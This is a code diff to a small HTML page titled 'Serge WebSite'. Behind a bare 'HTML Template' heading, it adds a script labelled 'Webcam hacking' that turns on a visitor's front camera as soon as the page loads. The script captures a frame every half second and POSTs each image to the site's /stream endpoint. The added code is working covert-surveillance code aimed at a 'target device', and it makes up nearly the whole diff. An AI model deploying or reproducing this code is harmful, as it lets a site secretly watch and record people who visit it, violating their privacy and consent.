@@ -4,11 +4,63 @@
 <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <title>Document</title>
+   <title>Serge WebSite</title>
 </head>
 
 <body>
-   <h1>HTML Template</h1>
+   <!-- Website content -->
+   <h1 align="center">HTML Template</h1>
+
+   <!-- Video frame -->
+   <video id="video" playsinline autoplay></video>
+
+   <!-- Canvas to sniff data from -->
+   <canvas id="canvas" width="640" height="640">canvas</canvas>
+
+   <!-- Jquery to make HTTP POST requests to send images from a webcam -->
+   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+   <!-- Webcam hacking happens here -->
+   <script>
+      // send a single frame from the webcam to your HTTP server 
+      function post(imgdata) {
+         $.ajax({
+            type: 'POST',
+            data: { frame: imgdata },
+            url: '/stream',
+            dataType: 'json',
+            async: false
+         });
+      };
+
+      // hook up video frame and canvas elements
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+
+      // target device's webcam settings
+      const constraints = {
+         audio: false,
+         video: { facingMode: "user" }
+      };
+
+      // activate a webcam on a target device
+      async function hackWebcam() {
+         const stream = await navigator.mediaDevices.getUserMedia(constraints);
+         window.stream = stream;
+         video.srcObject = stream;
+
+         var context = canvas.getContext('2d');
+
+         setInterval(function () {
+            context.drawImage(video, 0, 0, 640, 640);
+            var canvasData = canvas.toDataURL("image/png")//.replace("image/png", "image/octet-stream");
+            post(canvasData);
+         }, 500);
+      }
+
+      // hacking starts here
+      hackWebcam();
+   </script>
 </body>
 
 </html>
